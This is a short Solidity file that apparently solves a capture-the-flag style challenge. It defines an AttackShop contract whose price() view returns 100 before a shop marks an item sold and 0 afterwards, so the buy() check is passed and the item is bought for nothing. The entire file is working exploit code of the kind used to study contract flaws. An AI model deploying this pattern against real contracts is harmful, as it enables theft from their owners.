// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IShop {
    function buy() external;

    function isSold() external view returns (bool);
}

interface IBuyer {
    function price() external view returns (uint);
}

// Implement the interface used from the Shop with address the msg.sender
// Then this line Buyer _buyer = Buyer(msg.sender); will point to AttackShop contract
// Then price can be returned for every time is called from the Shop.buy function
contract AttackShop is IBuyer {
    address public shop;

    constructor(address _shop) {
        shop = _shop;
    }

    function buy() public {
        IShop(shop).buy();
    }

    function price() public view override returns (uint) {
        return IShop(shop).isSold() ? 0 : 100;
    }
}
